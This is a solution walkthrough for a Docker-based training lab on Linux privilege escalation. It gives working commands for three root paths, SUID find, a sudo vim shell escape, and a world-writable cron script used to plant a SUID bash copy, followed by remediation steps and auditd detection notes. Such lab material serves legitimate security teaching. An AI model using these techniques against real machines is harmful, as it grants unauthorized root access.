# Day 5 Lab — Solution / Full Privesc Walkthrough

## Authorized use only

Same notice as [`README.md`](README.md): only run these commands against the `target`
container this lab starts, on `cyberlab`.

## A note on how this was verified

`target/Dockerfile` was built standalone (`docker build`) and each of the three
escalation vectors was confirmed live against that image with an isolated single-
container `docker run`/`docker exec` (not via `docker compose`, and not on the shared
`cyberlab` network — this lab's authoring constraint was config-only validation for
the multi-container flow, i.e. `docker compose config -q`, plus this one quick,
isolated build+run check). Confirmed in that isolated test, exactly as documented
below: the image builds; `test -u /usr/bin/find` reports the SUID bit present;
Vector 1's `find . -exec /bin/sh -p ...` yields `euid=0(root)`; Vector 2's
`sudo vim -c ':!id'` yields `uid=0(root)`; Vector 3's writable-cron-script exploit
produces a working SUID `/tmp/rootbash` after cron's real ~60-second tick, and
running it yields `euid=0(root)`.

**Not yet live-verified — needs a smoke test:** the full `docker compose` flow itself
(`docker compose up -d --build` on the shared `cyberlab` network, `docker compose
exec target su - lowpriv`, the `/loot` bind mount shared with `attacker`, and
`linpeas.sh` actually running against this target). Only `docker compose config -q`
was run for that part. The exact commands in this file are the same commands used in
the confirmed isolated test, adjusted only to go through `docker compose exec target
...` instead of `docker exec <container>` directly — the underlying exploit mechanics
are identical and already confirmed; what's unverified is the compose/network
plumbing around them.

## Presence check (Vector 1, before exploitation)

```sh
cd cyber_security/labs/day05
docker compose exec target sh -c "test -u /usr/bin/find && echo VULN_PRESENT"
```

**Expected output:** `VULN_PRESENT`. The Dockerfile's `RUN chmod u+s /usr/bin/find`
sets the setuid bit at build time, independent of anything an attacker does
afterward; `test -u <path>` succeeds exactly when that bit is set — this checks the
vector is *planted*, not that it's been *exploited*.

## Foothold

```sh
cd cyber_security/labs/day05
docker compose exec target su - lowpriv
```

**Expected output:** a shell prompt as `lowpriv` (password `lowpriv`, set in the
Dockerfile via `chpasswd`). Confirm with `id`:

```
uid=1000(lowpriv) gid=1000(lowpriv) groups=1000(lowpriv)
```

## Enumeration

By hand (works with no internet access, since `target` has none configured):

```sh
find / -perm -4000 -type f 2>/dev/null
sudo -l
ls -la /etc/cron.d/ /opt/scripts/
```

**Expected output:**

- `find / -perm -4000 -type f 2>/dev/null` lists every SUID binary on the box,
  including `/usr/bin/find` — abnormal; a stock Debian image's `find` is never SUID.
  (The list also includes normal, expected SUID binaries like `/usr/bin/passwd` and
  `/usr/bin/sudo` themselves — part of Drill 1's point: not every line in this output
  is exploitable, only the one that doesn't belong.)
- `sudo -l` shows: `(root) NOPASSWD: /usr/bin/vim` — Vector 2, directly named.
- `ls -la /etc/cron.d/` shows `backup-job` (mode 644, owned by root, unremarkable on
  its own); `ls -la /opt/scripts/` shows `backup.sh` at mode `777` — writable by
  `lowpriv` even though it's owned by root and root's cron runs it. That mode-777 line
  is Vector 3.

If `linpeas.sh` was fetched (see [`tools/README.md`](tools/README.md)):

```sh
sh /loot/day05/linpeas.sh -q | tee /loot/day05/linpeas_out.txt
```

**Expected:** linpeas highlights all three of the above in its own colored/flagged
sections (SUID binaries, sudo rights, writable files run by root) — a real run
cross-checks the manual enumeration above rather than replacing it.

## Vector 1 (PRIMARY) — SUID `find`

```sh
find . -exec /bin/sh -p \; -quit
```

**What this does:** `find`'s `-exec` flag runs the given command with `find`'s own
*effective* privileges — root, because of the SUID bit — not the caller's real
privileges. `/bin/sh -p` specifically requests that dash (Debian's `/bin/sh`) **not**
drop its elevated privileges on startup (dash's default behavior when real and
effective UID differ is to drop straight back to the real UID, which would defeat
this entirely); `-quit` stops `find` after the first match so it doesn't keep
recursing.

**Expected output:** a new shell prompt; confirm with `id`:

```
uid=0(root) gid=1000(lowpriv) groups=1000(lowpriv)
```

`uid=0` — full root, from a `find` invocation that looks, at a glance, like completely
ordinary use of a completely ordinary command.

## Vector 2 — sudo `vim`

From a fresh `lowpriv` shell (or the same one — this vector is independent of Vector
1):

```sh
sudo vim -c ':!/bin/sh'
```

**What this does:** the sudoers rule lets `lowpriv` run `vim` as root with no
password and no restriction on vim's own capabilities. Vim's `:!<cmd>` runs `<cmd>` in
a subshell — and that subshell inherits vim's own (root) privileges, since sudo
already elevated the whole `vim` process before vim ever started.

**Expected output:** a shell prompt; `id` shows:

```
uid=0(root) gid=0(root) groups=0(root)
```

Full root — a second, entirely independent path to the same place, requiring no SUID
binary at all, just the sudoers line and vim's willingness to shell out.

## Vector 3 — world-writable cron script

```sh
echo 'cp /bin/bash /tmp/rootbash && chmod u+s /tmp/rootbash' >> /opt/scripts/backup.sh
# wait up to 60 seconds for cron's next minute tick
sleep 65
/tmp/rootbash -p
```

**What this does:** `/opt/scripts/backup.sh` is mode `777`, so `lowpriv` can append to
it directly even though root owns it. `/etc/cron.d/backup-job` runs that exact script
as root every minute — root's own cron daemon, unmodified, becomes the mechanism that
executes the attacker's appended line *as root*, on its normal schedule, with no
direct interaction from `lowpriv` needed once the file is rewritten. The appended line
copies `/bin/bash` to a path `lowpriv` also owns and sets its SUID bit — turning a
one-time root execution into a durable, reusable root-shell binary.

**Expected output:** after the sleep, `/tmp/rootbash` exists with the setuid bit set
(owned by root, since cron ran the `cp`/`chmod` as root); `/tmp/rootbash -p` (again,
`-p` to keep bash from dropping its elevated effective UID on startup) gives:

```
uid=0(root) gid=1000(lowpriv) groups=1000(lowpriv)
```

Full root — a third, independent path, and the only one of the three that doesn't
require a single interactive command run *as* root at any point; the attacker only
ever touches the world-writable script as `lowpriv`.

## Defense Lab — confirmed-by-reasoning before/after (needs smoke test)

### Fix 1 — remove the SUID bit from `find`

```sh
docker compose exec target sh -c "chmod u-s /usr/bin/find"
docker compose exec target sh -c "test -u /usr/bin/find && echo STILL_VULN || echo FIXED"
```

**Expected output:** `FIXED`. Re-running Vector 1's exact `find . -exec /bin/sh -p \;
-quit` afterward, as `lowpriv`, should now drop into a shell with `uid=1000`, not
`uid=0` — `-exec` still runs, but with `lowpriv`'s own real privileges, since there's
no elevated effective UID left to inherit. This is the **least-privilege** fix: `find`
never needed the SUID bit to do its normal job in the first place.

### Fix 2 — remove or scope the sudo rule

```sh
docker compose exec target sh -c "rm /etc/sudoers.d/lowpriv"
```

**Expected output:** `sudo -l` as `lowpriv` afterward shows no entries; `sudo vim ...`
fails with a permission error. Drill 2 below covers the narrower fix (scoping instead
of removing) for cases where `lowpriv` genuinely needs *some* root capability.

### Fix 3 — fix the script's permissions

```sh
docker compose exec target sh -c "chmod 700 /opt/scripts/backup.sh"
```

**Expected output:** `lowpriv` can no longer write to `backup.sh` (permission
denied); root's cron job continues running the *original*, unmodified script every
minute, exactly as intended — the fix removes the write access that made the script
attacker-controllable, without disabling the legitimate backup job itself.

### `auditd` — what it would have logged

`auditd` is installed in this image (see Dockerfile) but not started by default (no
rules configured, matching a genuinely common real-world gap this path calls out
rather than hides). With a rule watching privileged execve/file-write events (see
Drill 3 in `content/day05-privesc.md` for the exact rule shape), each of the three
exploit steps above would generate a distinct audit trail entry: Vector 1's `find`
run would show an `execve` of `/bin/sh` with an effective UID (`euid=0`) that doesn't
match the process's real UID (`ruid=1000`) — the single strongest, most generic signal
for *any* SUID-abuse privesc, not just this one; Vector 2 would show `sudo`'s own audit
log entry naming `lowpriv` running `/usr/bin/vim` as `root`; Vector 3 would show a
`write` syscall against `/opt/scripts/backup.sh` by `lowpriv`, followed roughly a
minute later by an `execve` of that same path with `ruid=0` (cron's own execution).

## Teardown

```sh
cd cyber_security/labs/day05
docker compose down
```

This removes only `target` — `labs/base`'s `attacker` container, the `cyberlab`
network, and anything staged under `labs/base/loot/day05/` are untouched. Tear down
`labs/base` separately (`cd ../base && ./down.sh`) only once you're done with the whole
session.
